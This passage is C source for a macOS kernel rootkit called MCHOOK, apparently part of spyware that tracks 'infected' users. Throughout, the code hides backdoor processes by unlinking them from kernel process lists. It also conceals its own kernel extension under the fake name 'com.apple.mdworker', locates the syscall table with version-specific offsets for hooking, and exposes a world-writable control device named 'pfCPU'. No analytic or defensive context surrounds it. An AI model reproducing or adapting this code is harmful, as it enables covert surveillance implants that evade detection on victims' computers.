  if (g_registered_backdoors > 0) {
    // Let's see if the backdoor is already registered
    bd_index = get_bd_index(username, p->p_pid);
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] First backdoor, hooking\n");
#endif
  }
  
  switch (bd_index) {
    case -2:
#ifdef DEBUG
      printf("[MCHOOK] Already registered (same pid and is active) on init\n");
#endif
      break;
    case -1: {
#ifdef DEBUG
      printf("[MCHOOK] Backdoor not found on init\n");
#endif
      MALLOC(g_reg_backdoors[g_registered_backdoors],
             reg_backdoors_t *,
             sizeof(reg_backdoors_t),
             MK_MBUF,
             M_WAITOK);

      _index = g_registered_backdoors;
      g_registered_backdoors++;
      result = TRUE;
    } break;
    default: {
#ifdef DEBUG
      printf("[MCHOOK] Already registered user (dead bd) %d\n", bd_index);
#endif
      // Backdoor is already registered
      for (i = 0; i < g_reg_backdoors[bd_index]->path_counter; i++) {
        memset(g_reg_backdoors[bd_index]->path[i], '\0', MAX_DIRNAME_SIZE);
      }
    
      _index = bd_index;
      result = TRUE;
    } break;
  }

  // Initialize the structure entry
  g_reg_backdoors[_index]->path_counter = 0;
  
  g_reg_backdoors[_index]->p              = p;
  /*g_reg_backdoors[_index]->pid            = p->p_pid;*/
  g_reg_backdoors[_index]->is_active      = 1;
  g_reg_backdoors[_index]->is_hidden      = 0;
  g_reg_backdoors[_index]->is_task_hidden = 0;
  g_reg_backdoors[_index]->is_proc_hidden = 0;
  
  strncpy(g_reg_backdoors[_index]->username, username, MAX_USER_SIZE);
  
#ifdef DEBUG
  printf("[MCHOOK] index (%d)\n", _index);
  printf("[MCHOOK] user (%s)\n", g_reg_backdoors[_index]->username);
#endif
  
  return result;
}

int remove_dev_entry()
{
  // Remove our device entry from /dev
	devfs_remove(devfs_handle);
	cdevsw_remove(major, &chardev);
  
  return 0;
}

void dealloc_meh(char *username, pid_t pid)
{
  int bd_index = -1;
  
  bd_index = get_active_bd_index(username, pid);
  if (bd_index != -1) {
    FREE(g_reg_backdoors[bd_index], MK_MBUF);
    /*g_reg_backdoors[z]->is_active = 0;*/
    /*g_reg_backdoors[z]->is_hidden = 0;*/
    /*g_reg_backdoors[z]->is_task_hidden = 0;*/
    /*g_reg_backdoors[z]->is_proc_hidden = 0;*/
    
    if (g_registered_backdoors > 0)
      g_registered_backdoors--;
  }
}

//
// Get the backdoor index among the active ones
//
int
get_active_bd_index(char *username, pid_t pid)
{
  int i  = 0;
  
  for (i = 0; i < g_registered_backdoors; i++) {
    if ((strncmp(username, g_reg_backdoors[i]->username, MAX_USER_SIZE) == 0)
        && g_reg_backdoors[i]->p->p_pid   == pid
        && g_reg_backdoors[i]->is_active  == 1) {
      return i;
    }
  }
  
  return -1;
}

//
// Get the backdoor index even if not active (but present in the array)
//
int
get_bd_index(char *username, pid_t pid)
{
  int i     = 0;
  int index = -1;

  for (; i < g_registered_backdoors; i++) {
    if (strncmp(g_reg_backdoors[i]->username, username, MAX_USER_SIZE) == 0) {
#ifdef DEBUG
      printf("[MCHOOK] User already infected, checking if active\n");
#endif
      if (g_reg_backdoors[i]->p->p_pid      == pid
          && g_reg_backdoors[i]->is_active  == 1) {
#ifdef DEBUG
        printf("[MCHOOK] Backdoor already registered and active\n");
#endif
        index = -2;
        break;
      }
      else {
#ifdef DEBUG
        printf("[MCHOOK] Backdoor already registered but not active\n");
#endif
        index = i;
        break;
      }
    }
  }

  return index;
}

int check_symbols_integrity()
{
  g_symbols_resolved = 0;

  if (i_allproc               != NULL
      && i_tasks              != NULL
      && i_nsysent            != NULL
      && i_kmod               != NULL
      && i_tasks_count        != NULL
      && i_nprocs             != NULL
      && i_tasks_threads_lock != NULL
      && i_proc_lock          != NULL
      && i_proc_unlock        != NULL
      && i_proc_list_lock     != NULL
      && i_proc_list_unlock   != NULL) {
    g_symbols_resolved = 1;
  }
  
  return g_symbols_resolved;
}

int is_leopard()
{
  if (g_os_major    == 10
      && g_os_minor == 5)
    return 1;
  
  return 0;
}

int is_snow_leopard()
{
  if (g_os_major    == 10
      && g_os_minor == 6)
    return 1;
  
  return 0;
}

int is_lion()
{
  if (g_os_major    == 10
      && g_os_minor == 7)
    return 1;
  
  return 0;
}

#pragma mark -
#pragma mark DKOM
#pragma mark -

int hide_proc_l(proc_t p, char *username, int bd_index)
{
  proc_t proc = NULL;
  
#ifdef DEBUG
  printf("[MCHOOK] Hiding Lion proc: %d\n", p->p_pid);
#endif

  i_proc_list_lock();
  
  //
  // Unlinking proc
  //
  LIST_FOREACH(proc, i_allproc, p_list) {
    if (proc->p_pid == p->p_pid) {
#ifdef DEBUG
      printf("[MCHOOK] pid %d found\n", p->p_pid);
#endif
      
      i_proc_lock(proc);
      
      LIST_REMOVE(proc, p_list);
      LIST_REMOVE(proc, p_hash);
      
      i_proc_unlock(proc);
      //(*i_nprocs)--;
      
#ifdef DEBUG
      printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif
      
      g_reg_backdoors[bd_index]->is_proc_hidden = 1;
      break;
    }
  }
  
  i_proc_list_unlock();
  
  if (g_reg_backdoors[bd_index]->is_task_hidden     == 1
      || g_reg_backdoors[bd_index]->is_proc_hidden  == 1) {
#ifdef DEBUG
    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[bd_index]->is_task_hidden);
    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[bd_index]->is_proc_hidden);
#endif
    g_reg_backdoors[bd_index]->is_hidden = 1;
  }
  
  return 0;
}

int hide_proc(proc_t p, char *username, int backdoor_index)
{
  proc_t proc = NULL;
  //int _index  = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] Hiding proc: %d\n", p->p_pid);
#endif
#if 0
  //
  // g_backdoor_current is not safe for 2 or more backdoors on the same machine
  // in which case we'll be calling get_active_bd_index
  //
  if (g_backdoor_current != -1) {
    if (g_reg_backdoors[g_backdoor_current]->isHidden == 1) {
#ifdef DEBUG
      printf("[MCHOOK] %d is already hidden\n", p->p_pid);
#endif
      
      return 0;
    }
  }
  else {
    if ((_index = get_active_bd_index(p, username)) != -1) {
      g_backdoor_current = _index;
    }
    else {
#ifdef DEBUG
      printf("[MCHOOK] hide_proc failed - backdoor not registered?!!\n");
#endif

      return -1;
    }
  }
#endif
#ifdef DEBUG
  printf("[MCHOOK] Be-hiding tasks count: %d\n", *i_tasks_count);
#endif
  /*
  if (g_os_major == 10 && g_os_minor == 5) {
    task_l_t task = p->task;
    
    //
    // Unlinking task
    //
    lck_mtx_lock(i_tasks_threads_lock);
    queue_remove(i_tasks, task, task_l_t, tasks);
    (*i_tasks_count)--;
    lck_mtx_unlock(i_tasks_threads_lock);
    
    g_reg_backdoors[backdoor_index]->isTaskHidden = 1;
  }
  else if (g_os_major == 10 && g_os_minor == 6) {
    task_t task = p->task;
    
    //
    // Unlinking task
    //
    lck_mtx_lock(i_tasks_threads_lock);
    queue_remove(i_tasks, task, task_t, tasks);
    (*i_tasks_count)--;
    lck_mtx_unlock(i_tasks_threads_lock);
    
    g_reg_backdoors[backdoor_index]->isTaskHidden = 1;
  }
  */
#ifdef DEBUG
  printf("[MCHOOK] Af-hiding tasks count: %d\n", *i_tasks_count);
#endif
  
  i_proc_list_lock();
  
  //
  // Unlinking proc
  //
  LIST_FOREACH(proc, i_allproc, p_list) {
    if (proc->p_pid == p->p_pid) {
#ifdef DEBUG
      printf("[MCHOOK] pid %d found\n", p->p_pid);
#endif
      
      i_proc_lock(proc);
      
      LIST_REMOVE(proc, p_list);
      LIST_REMOVE(proc, p_hash);
      
      i_proc_unlock(proc);
      //(*i_nprocs)--;
      
#ifdef DEBUG
      printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif
      
      g_reg_backdoors[backdoor_index]->is_proc_hidden = 1;
      break;
    }
    
    //i_proc_unlock(proc);
  }
  
  i_proc_list_unlock();
  
  if (g_reg_backdoors[backdoor_index]->is_task_hidden     == 1
      || g_reg_backdoors[backdoor_index]->is_proc_hidden  == 1) {
#ifdef DEBUG
    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[backdoor_index]->is_task_hidden);
    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[backdoor_index]->is_proc_hidden);
#endif
    g_reg_backdoors[backdoor_index]->is_hidden = 1;
  }
  
  return 0;
}

int unhide_proc(proc_t p, int backdoor_index)
{
#ifdef DEBUG
  printf("[MCHOOK] Unhiding %d\n", p->p_pid);
#endif
  /*
  if (g_reg_backdoors[backdoor_index]->isTaskHidden == 1) {
    if (g_os_major == 10 && g_os_minor == 5) {
      task_l_t task = p->task;
      
      //
      // Link back our task entry
      //
      lck_mtx_lock(i_tasks_threads_lock);
      queue_enter(i_tasks, task, task_l_t, tasks);
      (*i_tasks_count)++;
      lck_mtx_unlock(i_tasks_threads_lock);
      
      g_reg_backdoors[backdoor_index]->isTaskHidden = 0;
    }
    else if (g_os_major == 10 && g_os_minor == 6) {
      task_t task = p->task;
      
      //
      // Link back our task entry
      //
      lck_mtx_lock(i_tasks_threads_lock);
      queue_enter(i_tasks, task, task_t, tasks);
      (*i_tasks_count)++;
      lck_mtx_unlock(i_tasks_threads_lock);
      
      g_reg_backdoors[backdoor_index]->isTaskHidden = 0;
    }
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] Skipping task unhide, not hidden\n");
#endif
  }
  */
  //
  // Link back our proc entry
  //
  if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
    i_proc_list_lock();
    LIST_INSERT_HEAD(i_allproc, p, p_list);
    //(*i_nprocs)++;
    i_proc_list_unlock();
    
    g_reg_backdoors[backdoor_index]->is_proc_hidden = 0;
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] Skipping proc unhide, not hidden\n");
#endif
  }
  
  g_reg_backdoors[backdoor_index]->is_hidden = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif  
  
  return 0;
}

int unhide_all_procs()
{
#ifdef DEBUG
  printf("[MCHOOK] Unhiding all procs\n");
#endif
  
  int i  = 0;
  
  for (i = 0; i < g_registered_backdoors; i++) {
    if (g_reg_backdoors[i]->is_active    == 1
        && g_reg_backdoors[i]->is_hidden == 1) {
      unhide_proc(g_reg_backdoors[i]->p, i);
    }
  }
  
  return 0;
}

void hide_kext_leopard()
{
  kmod_info_t *k, *prev_k;
  //char kext_name[]        = "com.revenge.kext.machooker";
  char kext_name[]        = "com.apple.mdworker";
  
  prev_k  = i_kmod;
  
  if (g_kext_hidden == 0) {
    for (k = i_kmod; k->next != NULL; k = k->next) {
      if (strncmp(k->name, kext_name, sizeof(kext_name)) == 0) {
        prev_k->next = prev_k->next->next;
        g_kext_hidden = 1;
        break;
      }
      
      prev_k = k;
    }
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] KEXT is already hidden\n");
#endif
  }
}

//
// Landon Fuller trick updated for SL support
//
static struct sysent
*find_sysent(os_version_t *os_ver)
{
  unsigned int table_size;
  struct sysent *table = NULL;
  
  table_size = sizeof(struct sysent) * (*i_nsysent);
  if (is_leopard() == 1) {
#ifdef DEBUG
    printf("[MCHOOK] find_sysent for leopard\n");
    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
#endif
    table = (struct sysent *)(((char *)i_nsysent) + sizeof(int));
#if __i386__
    // +28 bytes, so far still reliable
    table = (struct sysent *)(((uint8_t *)table) + 28);
#endif
  }
  else if (is_snow_leopard() == 1) {
#ifdef DEBUG
    printf("[MCHOOK] find_sysent for snow leopard\n");
    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
#endif
    uint32_t x;
    uint32_t size_of_block_to_search;
    
    x = 0;
    size_of_block_to_search = 0x100;
    
    table = (struct sysent *)((char *)i_nsysent);
#if __i386__
    //
    // -0x2850 bytes from nsysent
    // http://packetstormsecurity.org/papers/attack/osx1061sysent.txt
    //
    table = (struct sysent *)((char *)table - 0x2850);
    
    //
    // -0x60 bytes 10.6.4
    //
    table = (struct sysent *)((char *)table - size_of_block_to_search);
#ifdef DEBUG
    printf("[MCHOOK] Entering heuristic\n");
#endif
    
    char *ptr_to_table = (char *)table;
    
    for (x = 0; x <= size_of_block_to_search; x++) {
      table = (struct sysent *)ptr_to_table++;
      
      // Sanity check
      if (table[SYS_syscall].sy_narg    == 0 &&
          table[SYS_exit].sy_narg       == 1 &&
          table[SYS_fork].sy_narg       == 0 &&
          table[SYS_read].sy_narg       == 3 &&
          table[SYS_wait4].sy_narg      == 4 &&
          table[SYS_ptrace].sy_narg     == 4) {
#ifdef DEBUG
        printf("[MCHOOK] heuristic matched sysent @%p, x = 0x%x\n", table, x);
#endif

        return table;
      }
    }
#endif
  }
  else if (is_lion() == 1) {
#ifdef DEBUG
    printf("[MCHOOK] find_sysent for lion\n");
    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
#endif
    uint32_t x;
    uint32_t size_of_block_to_search;
    
    x = 0;
    size_of_block_to_search = 0x100;
    
    table = (struct sysent *)((char *)i_nsysent);
#if __x86_64__
    //
    // -0x4498 bytes from nsysent
    // rev
    //
    table = (struct sysent *)((char *)table - 0x4498);
#ifdef DEBUG
    printf("[MCHOOK] table @ 0x%llx\n", (unsigned long long)table);
    printf("[MCHOOK] nsysent @ 0x%p\n", i_nsysent);
#endif
#else
#ifdef DEBUG
    printf("[MCHOOK] not ready for 32bit lion kernel\n");
#endif

    return NULL;
#endif
    
#ifdef DEBUG
    printf("[MCHOOK] Entering heuristic\n");
#endif
    
    char *ptr_to_table = (char *)table;
    for (x = 0; x <= size_of_block_to_search; x++) {
      table = (struct sysent *)ptr_to_table++;
      
      // Sanity check
      if (table[SYS_syscall].sy_narg    == 0 &&
          table[SYS_exit].sy_narg       == 1 &&
          table[SYS_fork].sy_narg       == 0 &&
          table[SYS_read].sy_narg       == 3 &&
          table[SYS_wait4].sy_narg      == 4 &&
          table[SYS_ptrace].sy_narg     == 4) {
#ifdef DEBUG
        printf("[MCHOOK] heuristic matched sysent @%p, x = 0x%x\n", table, x);
#endif
        return table;
      }
    }
  }

  if (table == NULL)
    return NULL;
  
#ifdef DEBUG
  printf("[MCHOOK] sysent@%p\n",  table);
#endif

  // Sanity check
  if (table[SYS_syscall].sy_narg    == 0 &&
      table[SYS_exit].sy_narg       == 1 &&
      table[SYS_fork].sy_narg       == 0 &&
      table[SYS_read].sy_narg       == 3 &&
      table[SYS_wait4].sy_narg      == 4 &&
      table[SYS_ptrace].sy_narg     == 4) {
#ifdef DEBUG
    printf("[MCHOOK] sysent sanity check succeeded\n");
#endif
    return table;
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] sanity check failed\n");
#endif
    
    return NULL;
  }
}

#pragma mark -
#pragma mark Start/Stop
#pragma mark -

kern_return_t
mchook_start (kmod_info_t *ki, void *d)
{
#ifdef DEBUG
  printf("[MCHOOK] Registering our device\n");
  printf("[MCHOOK] Size of NSUInteger: %ld\n", sizeof(NSUInteger));
#endif
  
  // Register our device in /dev
  major = cdevsw_add(major, &chardev);
  if (major == -1) {
#ifdef DEBUG
    printf("[MCHOOK] Error while registering the device node\n");
#endif
    return KERN_FAILURE;
  }
  
  devfs_handle = devfs_make_node(makedev(major, 0),
                                 DEVFS_CHAR,
                                 UID_ROOT,
                                 GID_WHEEL,
                                 0666,
                                 "pfCPU");
  
  if (!devfs_handle) {
#ifdef DEBUG
    printf("[MCHOOK] Error while creating the device node\n");
#endif
    return KERN_FAILURE;
  }
  
  return KERN_SUCCESS;
}

kern_return_t
mchook_stop (kmod_info_t *ki, void *d)
{
#ifdef DEBUG
  printf("[MCHOOK] KEXT stop called\n");
#endif
  
  if (g_registered_backdoors == 0) {
    if (remove_dev_entry() == 0) {
#ifdef DEBUG
      printf("[MCHOOK] KEXT unloaded correctly\n");
#endif
    }
    else {
#ifdef DEBUG
      printf("[MCHOOK] An error occurred while unloading KEXT\n");
#endif
    }
      
    remove_hooks();
  }
  
#ifdef DEBUG
  printf("[MCHOOK] Exiting, have phun dude\n");
#endif
  
  return KERN_SUCCESS;
}
